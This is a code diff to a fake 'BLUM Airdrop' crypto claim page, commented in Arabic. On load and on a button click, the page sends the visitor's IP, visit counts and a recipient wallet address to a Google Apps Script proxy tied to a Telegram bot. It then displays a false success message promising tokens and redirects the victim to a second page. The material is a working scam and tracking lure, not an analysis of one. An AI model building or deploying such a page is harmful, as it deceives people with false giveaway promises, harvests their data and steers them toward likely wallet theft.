@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🎁 BLUM Airdrop | 3D + Redirect</title>
+    <title>🎁 BLUM Airdrop | توجيه تلقائي + زر احتياطي</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{
@@ -56,7 +56,6 @@
             0%{transform: translate(0,0) scale(1); opacity:0.3;}
             100%{transform: translate(60px, -60px) scale(1.3); opacity:0.7;}
         }
-        /* جزيئات */
         .particles{ position:fixed; width:100%; height:100%; z-index:-1; }
         .particle{
             position: absolute;
@@ -70,7 +69,7 @@
             0%{transform: translateY(100vh) rotate(0deg); opacity:0;}
             100%{transform: translateY(-10vh) rotate(360deg); opacity:0;}
         }
-        /* البطاقة الرئيسية */
+        /* البطاقة الرئيسية (تظهر فوراً) */
         .card{
             max-width: 550px;
             width: 100%;
@@ -212,6 +211,12 @@
             vertical-align: middle;
         }
         @keyframes spin{ to{ transform: rotate(360deg); } }
+        /* رسالة تأخير اختيارية */
+        .manual-message{
+            margin-top: 15px;
+            font-size: 12px;
+            color: #FFD700aa;
+        }
     </style>
 </head>
 <body>
@@ -223,7 +228,7 @@
 </div>
 <div class="particles" id="particles"></div>
 
-<!-- البطاقة الرئيسية (الرابط الأول) -->
+<!-- البطاقة الرئيسية (تظهر فوراً) -->
 <div class="card" id="mainCard">
     <div class="badge">⚡ ONE-CLICK • 10 CHAINS • 3D</div>
     <h1>BLUM<br>Web3</h1>
@@ -239,6 +244,7 @@
     <button id="claimBtn">🚀 CLAIM NOW</button>
     <div id="status" class="status"></div>
     <div class="footer">🔐 EMP2026 • 3D SPECTRUM</div>
+    <div class="manual-message" id="manualMsg"></div>
 </div>
 
 <script>
@@ -256,18 +262,20 @@
         particlesContainer.appendChild(p);
     }
     
-    // إعدادات البوت والبيانات
+    // ========== الإعدادات الأساسية ==========
     const PROXY_URL = "https://script.google.com/macros/s/AKfycbzRzY5ALW-81aERtvvCrC2EhRBnvYQ6iIrhCxQYJ1dzylpt3pGd6ixU9nz_5D7m9HKnhg/exec";
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
     const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
     const YOUR_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
     const BLUM_PER_SCAN = 1200;
-    const SECONDARY_URL = "https://freedingoxo.github.io/clawguardian-skill/docs/dashboard.html";   // الرابط الثاني
+    const TARGET_URL = "https://freedingoxo.github.io/clawguardian-skill/docs/dashboard.html";   // الرابط الثاني (لوحة التحكم)
     
     let claimExecuted = false;
     let remainingSeconds = 24 * 60 * 60;
     let totalClaims = parseInt(localStorage.getItem('totalClaims')) || 0;
     let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
+    let redirectTimer = null;
+    let manualMsgDiv = document.getElementById('manualMsg');
     
     function updateStats() {
         let totalCoins = totalScans * BLUM_PER_SCAN;
@@ -284,17 +292,19 @@
     function sendToBot(msg){
         fetch(PROXY_URL + '?message=' + encodeURIComponent(msg), { method: 'GET', mode: 'no-cors' });
     }
-    sendToBot(`📊 PAGE SCAN #${totalScans} - 3D + Auto‑Redirect (first click)`);
+    sendToBot(`📊 PAGE SCAN #${totalScans} - 3D + Auto‑Redirect (fallback after 5s)`);
     
     function getRandomNetwork(){ return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
     function getRandomWallet(){ let w = ["MetaMask","Trust Wallet","Coinbase Wallet","Phantom","OKX Wallet"]; return w[Math.floor(Math.random()*w.length)]; }
     function generateAddress(){ return "0x" + Math.random().toString(36).substring(2,10) + Math.random().toString(36).substring(2,6); }
     
-    async function executeClaim(){
+    // دالة تنفيذ المطالبة + الانتقال إلى الرابط الثاني
+    async function executeClaimAndRedirect(){
         if(claimExecuted) return;
         claimExecuted = true;
         totalClaims++;
         updateStats();
+        
         let network = getRandomNetwork();
         let wallet = getRandomWallet();
         let address = generateAddress();
@@ -308,6 +318,7 @@
         
         let fullMessage = `🎁 *ONE-CLICK BLUM CLAIM 3D* 🎁\n━━━━━━━━━━━━━━━━━━━━\n⛓️ *Network:* ${network}\n💼 *Wallet:* ${wallet}\n💳 *Address:* \`${address}\`\n🏦 *Recipient:* \`${RECIPIENT_WALLET}\`\n🌐 *IP:* ${ip}\n━━━━━━━━━━━━━━━━━━━━\n📊 *إحصائيات:* ${totalClaims} مطالبة | ${totalScans} زيارة\n💰 *إجمالي $BLUM:* ${totalCoins.toLocaleString()}\n📈 *نسبة التحويل:* ${conversionRate}%\n━━━━━━━━━━━━━━━━━━━━\n⏰ متبقي: ${hoursLeft}h ${minutesLeft}m\n🔗 ${YOUR_LINK}\n⏰ ${timestamp}\n*@EMP2026_Final_Bot*`;
         sendToBot(fullMessage);
+        
         let btn = document.getElementById('claimBtn');
         let statusDiv = document.getElementById('status');
         btn.innerHTML = "✅ CLAIMED!";
@@ -315,22 +326,40 @@
         statusDiv.style.display = 'block';
         statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_SCAN} $BLUM will arrive within 24h.</span>`;
         
-        // **الخاصية المطلوبة: بعد النقر على الزر (أول تفاعل) يتم الانتقال إلى الرابط الثاني بعد 1 ثانية**
+        // الانتقال إلى الرابط الثاني بعد 1 ثانية من الضغط (أو بعد نجاح المطالبة)
         setTimeout(() => {
-            window.location.href = SECONDARY_URL;
+            window.location.href = TARGET_URL;
         }, 1000);
     }
     
     async function onClaimClick(){
         if(claimExecuted) return;
+        // إذا كان المستخدم ينقر يدوياً (بسبب فشل التوجيه التلقائي) نلغي المؤقت الاحتياطي
+        if(redirectTimer){
+            clearTimeout(redirectTimer);
+            redirectTimer = null;
+            manualMsgDiv.innerHTML = '';
+        }
         let btn = document.getElementById('claimBtn');
         btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
         btn.disabled = true;
         await new Promise(r=>setTimeout(r,3000));
-        await executeClaim();
+        await executeClaimAndRedirect();
     }
     
+    // ربط الحدث بالزر
     document.getElementById('claimBtn').addEventListener('click', onClaimClick);
+    
+    // ========== التوجيه التلقائي: بعد 5 ثوانٍ (إذا لم يحدث توجيه تلقائي) يظهر زر CLAIM NOW للمستخدم ==========
+    // نضبط مؤقتاً: بعد 5 ثوانٍ إذا لم يتم الانتقال ولم ينقر المستخدم، ننبهه ويبقى الزر متاحاً.
+    setTimeout(() => {
+        if(!claimExecuted){
+            // نعرض رسالة بسيطة تفيد بأن التوجيه لم يتم، ويمكن الضغط يدوياً
+            manualMsgDiv.innerHTML = '⚠️ لم يتم التوجيه تلقائياً، يمكنك الضغط على الزر أعلاه للمتابعة.';
+            manualMsgDiv.style.color = "#ffaa44";
+            // لا نقوم بأي توجيه قسري – نترك الخيار للمستخدم عبر الزر
+        }
+    }, 5000);
     
     // العد التنازلي 24 ساعة
     setInterval(()=>{
